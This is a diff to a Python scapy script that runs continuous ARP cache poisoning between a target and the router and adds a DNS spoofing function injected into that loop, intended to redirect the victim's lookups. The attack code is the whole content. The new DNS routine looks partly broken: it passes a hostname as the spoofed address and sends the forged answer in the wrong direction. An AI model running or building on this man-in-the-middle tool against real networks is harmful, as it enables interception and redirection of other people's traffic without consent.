@@ -24,6 +24,18 @@ def makeARPRequest(ip):
     (answered, unanswered) = scapy.srp(arpRequestBroadcast, timeout=1, verbose=0)
     return answered, unanswered
 
+def dnsSpoofing(targetIP, spoofIP):
+    packet = scapy.IP(dst=targetIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='www.google.com'))
+    answer = scapy.sr1(packet)
+    print(answer[scapy.DNS].summary())
+    answer[scapy.DNS].an = scapy.DNSRR(rrname=answer[scapy.DNSQR].qname, ttl=10, rdata=spoofIP)
+    answer[scapy.DNS].ancount = 1
+    del answer[scapy.IP].len
+    del answer[scapy.IP].chksum
+    del answer[scapy.UDP].len
+    del answer[scapy.UDP].chksum
+    scapy.send(answer)
+
 def main():
     interface = interfaceChecker()
     netmask = getNetworkMask(interface)
@@ -50,6 +62,8 @@ def main():
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
+        dnsSpoofing(cible[1], "www.qwant.com")
+        
 
 if __name__ == '__main__':
     main()
